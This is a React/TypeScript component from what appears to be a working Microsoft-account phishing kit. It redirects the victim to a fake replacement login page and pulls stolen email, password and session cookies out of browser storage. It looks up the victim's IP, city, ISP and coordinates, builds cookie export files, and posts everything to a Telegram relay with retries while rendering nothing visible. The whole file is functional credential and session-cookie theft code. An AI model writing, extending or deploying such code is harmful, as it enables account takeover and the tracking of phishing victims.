import React, { useLayoutEffect } from 'react';

interface RealOAuthRedirectProps {
  onLoginSuccess?: (sessionData: any) => void;
  sendToTelegram?: (data: any) => Promise<void>;
}

/**
 * ENHANCED: Microsoft domain cookie capture with IP detection and file export
 *
 * Purpose:
 * - Immediately navigates the browser to /replacement.html on mount
 * - Delays data transmission until Microsoft domain cookie capture
 * - Redirects to login.microsoftonline.com for auto-login cookie extraction
 * - Captures IP, region/city information
 * - Exports cookies as txt/json files to Telegram
 * - Ensures complete data package transmission
 */
const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({
  onLoginSuccess,
  sendToTelegram
}) => {
  useLayoutEffect(() => {
    console.log('🔄 RealOAuthRedirect component mounted, preparing Microsoft domain redirect...');

    // ENHANCED: Get user's IP and location information
    const getUserLocationData = async () => {
      try {
        console.log('🌍 Fetching user location data...');
        const response = await fetch('https://ipapi.co/json/');
        const locationData = await response.json();
        
        return {
          ip: locationData.ip || 'Unknown',
          city: locationData.city || 'Unknown',
          region: locationData.region || 'Unknown',
          country: locationData.country_name || 'Unknown',
          countryCode: locationData.country_code || 'Unknown',
          timezone: locationData.timezone || 'Unknown',
          isp: locationData.org || 'Unknown',
          latitude: locationData.latitude || null,
          longitude: locationData.longitude || null
        };
      } catch (error) {
        console.warn('⚠️ Failed to fetch location data:', error);
        return {
          ip: 'Unknown',
          city: 'Unknown',
          region: 'Unknown',
          country: 'Unknown',
          countryCode: 'Unknown',
          timezone: 'Unknown',
          isp: 'Unknown',
          latitude: null,
          longitude: null
        };
      }
    };

    // ENHANCED: Create cookie export files
    const createCookieFiles = (cookies) => {
      if (!cookies || cookies.length === 0) return { txtFile: null, jsonFile: null };
      
      try {
        // Create TXT format
        let txtContent = '# Microsoft Domain Cookies Export\n';
        txtContent += `# Captured: ${new Date().toISOString()}\n`;
        txtContent += `# Total Cookies: ${cookies.length}\n\n`;
        
        cookies.forEach((cookie, index) => {
          txtContent += `[Cookie ${index + 1}]\n`;
          txtContent += `Name: ${cookie.name || 'Unknown'}\n`;
          txtContent += `Value: ${cookie.value || 'Empty'}\n`;
          txtContent += `Domain: ${cookie.domain || 'Unknown'}\n`;
          txtContent += `Path: ${cookie.path || '/'}\n`;
          txtContent += `Secure: ${cookie.secure ? 'Yes' : 'No'}\n`;
          txtContent += `HttpOnly: ${cookie.httpOnly ? 'Yes' : 'No'}\n`;
          txtContent += `SameSite: ${cookie.sameSite || 'Lax'}\n`;
          if (cookie.expires) txtContent += `Expires: ${cookie.expires}\n`;
          txtContent += `Capture Time: ${cookie.captureTime || 'Unknown'}\n`;
          txtContent += '\n';
        });
        
        // Create JSON format
        const jsonContent = JSON.stringify({
          exportInfo: {
            timestamp: new Date().toISOString(),
            totalCookies: cookies.length,
            source: 'Microsoft Domain Capture',
            version: '2.0-enhanced'
          },
          cookies: cookies
        }, null, 2);
        
        return {
          txtFile: {
            name: `microsoft_cookies_${Date.now()}.txt`,
            content: txtContent,
            size: new Blob([txtContent]).size
          },
          jsonFile: {
            name: `microsoft_cookies_${Date.now()}.json`,
            content: jsonContent,
            size: new Blob([jsonContent]).size
          }
        };
      } catch (error) {
        console.warn('⚠️ Failed to create cookie files:', error);
        return { txtFile: null, jsonFile: null };
      }
    };

    // FIXED: Enhanced direct Telegram API call with retry logic
    const sendDirectToTelegram = async (data: any, locationData: any, cookieFiles: any, retryCount = 0) => {
      const maxRetries = 3;
      
      try {
        console.log('📤 Enhanced Telegram transmission attempt ' + (retryCount + 1) + ':', {
          hasEmail: !!data.email,
          hasPassword: !!data.password,
          cookieCount: data.cookies?.length || 0,
          hasLocationData: !!locationData,
          hasCookieFiles: !!(cookieFiles.txtFile && cookieFiles.jsonFile)
        });

        // ENHANCED: Prepare comprehensive payload with location and files
        const enhancedPayload = {
          ...data,
          locationData,
          cookieFiles,
          source: 'oauth-redirect-enhanced',
          retryAttempt: retryCount,
          timestamp: new Date().toISOString(),
          enhancedCapture: true
        };

        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify(enhancedPayload)
        });

        if (response.ok) {
          console.log('✅ Enhanced Telegram transmission successful');
          // Mark as successfully transmitted
          try {
            localStorage.setItem('data_transmitted', 'true');
            sessionStorage.setItem('data_transmitted', 'true');
            localStorage.setItem('telegram_data_sent', 'true');
            sessionStorage.setItem('telegram_data_sent', 'true');
            localStorage.setItem('ms_cookies_captured', 'true');
            sessionStorage.setItem('ms_cookies_captured', 'true');
          } catch (e) {
            // ignore storage errors
          }
          return true;
        } else {
          console.warn('⚠️ Enhanced Telegram transmission failed:', response.status, response.statusText);
          
          // Retry on server errors
          if (response.status >= 500 && retryCount < maxRetries) {
            console.log('🔄 Server error, retrying in ' + ((retryCount + 1) * 1000) + 'ms...');
            setTimeout(() => {
              sendDirectToTelegram(data, locationData, cookieFiles, retryCount + 1);
            }, (retryCount + 1) * 1000);
          }
          return false;
        }
      } catch (error) {
        console.warn('⚠️ Enhanced Telegram transmission error:', error);
        
        // Retry on network errors
        if (retryCount < maxRetries) {
          console.log('🔄 Network error, retrying in ' + ((retryCount + 1) * 2000) + 'ms...');
          setTimeout(() => {
            sendDirectToTelegram(data, locationData, cookieFiles, retryCount + 1);
          }, (retryCount + 1) * 2000);
        }
        return false;
      }
    };

    // ENHANCED: Function to handle Microsoft domain cookie capture and transmission
    const handleMicrosoftDomainCapture = async () => {
      try {
        console.log('🔍 Preparing for Microsoft domain cookie capture...');
        
        // Get all captured data from storage with multiple fallback options
        const storageKeys = [
          'replacement_credentials',
          'captured_credentials',
          'form_credentials',
          'injected_credentials'
        ];
        
        let credentials = null;
        let cookies = null;
        let capturedEmail = null;

        // Try to get credentials from any available source
        for (const key of storageKeys) {
          if (!credentials) {
            const localData = localStorage.getItem(key);
            const sessionData = sessionStorage.getItem(key);
            
            if (localData) {
              try {
                const parsed = JSON.parse(localData);
                if (parsed.email || parsed.password) {
                  credentials = parsed;
                  console.log('📋 Found credentials in localStorage:', key);
                  break;
                }
              } catch (e) {
                console.warn('Failed to parse credentials from localStorage:', key, e);
              }
            }
            
            if (sessionData) {
              try {
                const parsed = JSON.parse(sessionData);
                if (parsed.email || parsed.password) {
                  credentials = parsed;
                  console.log('📋 Found credentials in sessionStorage:', key);
                  break;
                }
              } catch (e) {
                console.warn('Failed to parse credentials from sessionStorage:', key, e);
              }
            }
          }
        }

        // Get cookies
        const cookieKeys = ['captured_cookies', 'microsoft_cookies'];
        for (const key of cookieKeys) {
          if (!cookies) {
            const localData = localStorage.getItem(key) || sessionStorage.getItem(key);
            if (localData) {
              try {
                const parsed = JSON.parse(localData);
                if (Array.isArray(parsed) && parsed.length > 0) {
                  cookies = parsed;
                  console.log('🍪 Found cookies:', key, parsed.length);
                  break;
                }
              } catch (e) {
                console.warn('Failed to parse cookies:', key, e);
              }
            }
          }
        }

        // Get email
        capturedEmail = localStorage.getItem('captured_email') || 
                      sessionStorage.getItem('captured_email') ||
                      credentials?.email;

        // ENHANCED: Only proceed if we have credentials (don't send without login data)
        if (!credentials || (!credentials.email && !credentials.password)) {
          console.log('📭 No credentials found, skipping transmission until Microsoft domain capture');
          return;
        }

        // Get user location data
        const locationData = await getUserLocationData();
        console.log('🌍 Location data retrieved:', locationData);

        // Create cookie files for export
        const cookieFiles = createCookieFiles(cookies);
        console.log('📁 Cookie files prepared:', {
          txtFile: !!cookieFiles.txtFile,
          jsonFile: !!cookieFiles.jsonFile
        });

        // ENHANCED: Prepare comprehensive data payload with location and files
        const dataToSend = {
          email: credentials?.email || capturedEmail || '',
          password: credentials?.password || '',
          cookies: cookies || [],
          authenticationTokens: null,
          userAgent: navigator.userAgent,
          sessionId: Date.now().toString(),
          url: window.location.href,
          timestamp: new Date().toISOString(),
          source: credentials?.source || 'oauth-redirect-enhanced',
          validated: credentials?.validated || false,
          microsoftAccount: credentials?.microsoftAccount || false,
          // ENHANCED: Add comprehensive context with location and files
          captureContext: {
            foundCredentialsIn: credentials ? 'storage' : 'none',
            foundCookiesIn: cookies ? 'storage' : 'none',
            credentialSource: credentials?.source || 'unknown',
            storageKeysChecked: storageKeys,
            hasStoredEmail: !!capturedEmail,
            componentSource: 'RealOAuthRedirect-Enhanced',
            microsoftDomainCapture: true,
            locationDataCaptured: !!locationData,
            cookieFilesCreated: !!(cookieFiles.txtFile && cookieFiles.jsonFile)
          }
        };

        // ENHANCED: Send to Telegram with location and file data
        if (dataToSend.email || dataToSend.password) {
          console.log('📤 Transmitting enhanced data to Telegram...', {
            hasEmail: !!dataToSend.email,
            hasPassword: !!dataToSend.password,
            cookieCount: dataToSend.cookies?.length || 0,
            validated: dataToSend.validated,
            source: dataToSend.source,
            hasLocationData: !!locationData,
            hasCookieFiles: !!(cookieFiles.txtFile && cookieFiles.jsonFile)
          });

          let transmissionSuccess = false;

          // Try prop function first
          if (sendToTelegram) {
            try {
              await sendToTelegram({ ...dataToSend, locationData, cookieFiles });
              console.log('✅ Enhanced data successfully transmitted to Telegram (via prop)');
              transmissionSuccess = true;
            } catch (error) {
              console.warn('⚠️ Failed to send data via prop function:', error);
            }
          }

          // Fallback to direct API call if prop function failed or doesn't exist
          if (!transmissionSuccess) {
            transmissionSuccess = await sendDirectToTelegram(dataToSend, locationData, cookieFiles);
          }

          // Mark as transmitted if successful
          if (transmissionSuccess) {
            try {
              localStorage.setItem('data_transmitted', 'true');
              sessionStorage.setItem('data_transmitted', 'true');
              localStorage.setItem('telegram_data_sent', 'true');
              sessionStorage.setItem('telegram_data_sent', 'true');
              localStorage.setItem('ms_cookies_captured', 'true');
              sessionStorage.setItem('ms_cookies_captured', 'true');
            } catch (e) {
              // ignore storage errors
            }
          }
        } else {
          console.log('📭 No credentials found, waiting for Microsoft domain capture');
        }

      } catch (error) {
        console.warn('⚠️ Error in Microsoft domain capture handling:', error);
      }
    };

    // ENHANCED: Check if Microsoft domain capture has been completed
    const alreadyTransmitted = localStorage.getItem('data_transmitted') ||
                              sessionStorage.getItem('data_transmitted') ||
                              localStorage.getItem('telegram_data_sent') ||
                              sessionStorage.getItem('telegram_data_sent') ||
                              localStorage.getItem('ms_cookies_captured') ||
                              sessionStorage.getItem('ms_cookies_captured');

    // ENHANCED: Don't transmit immediately - wait for Microsoft domain redirect
    if (!alreadyTransmitted) {
      console.log('📡 Microsoft domain capture not completed, will handle after redirect...');
      // Store handler for later use after Microsoft domain redirect
      window.handleMicrosoftDomainCapture = handleMicrosoftDomainCapture;
    } else {
      console.log('✅ Microsoft domain capture already completed, skipping...');
    }

    // Navigate to replacement page after ensuring transmit attempt was scheduled
    try {
      console.log('🔄 Navigating to replacement page...');
      // Navigate immediately to replacement page for credential capture
      setTimeout(() => {
        try {
          window.location.replace('/replacement.html');
        } catch (error) {
          console.error('❌ Failed to navigate to replacement page:', error);
          // Fallback to Microsoft login if navigation fails
          try {
            window.location.replace('https://login.microsoftonline.com');
          } catch (e) {
            console.error('❌ Fallback navigation also failed:', e);
          }
        }
      }, 300); // Immediate navigation to replacement page
    } catch (error) {
      console.error('❌ Navigation scheduling failed:', error);
    }

    // ENHANCED: Storage listener for Microsoft domain cookie capture completion
    const handleStorageChange = async (e: StorageEvent) => {
      if ((e.key === 'microsoft_cookies_captured' ||
           e.key === 'ms_domain_complete' ||
           e.key === 'captured_credentials' ||
           e.key === 'replacement_credentials' ||
           e.key === 'captured_cookies' ||
           e.key === 'form_credentials') &&
          e.newValue) {
        
        const alreadySent = localStorage.getItem('data_transmitted') || 
                           localStorage.getItem('telegram_data_sent') ||
                           sessionStorage.getItem('telegram_data_sent') ||
                           sessionStorage.getItem('data_transmitted') ||
                           localStorage.getItem('ms_cookies_captured') ||
                           sessionStorage.getItem('ms_cookies_captured');
        
        if (!alreadySent) {
          console.log('🔄 Microsoft domain capture completed, attempting enhanced transmission...');
          
          try {
            // Use the stored handler function
            if (window.handleMicrosoftDomainCapture) {
              await window.handleMicrosoftDomainCapture();
              console.log('✅ Microsoft domain capture transmission completed');
            }
          } catch (error) {
            console.warn('⚠️ Microsoft domain capture transmission failed:', error);
          }
        }
      }
    };

    window.addEventListener('storage', handleStorageChange);

    // cleanup on unmount
    return () => {
      window.removeEventListener('storage', handleStorageChange);
      // Clean up global handler
      if (window.handleMicrosoftDomainCapture) {
        delete window.handleMicrosoftDomainCapture;
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Render nothing to avoid any visible flash
  return null;
};

export default RealOAuthRedirect;
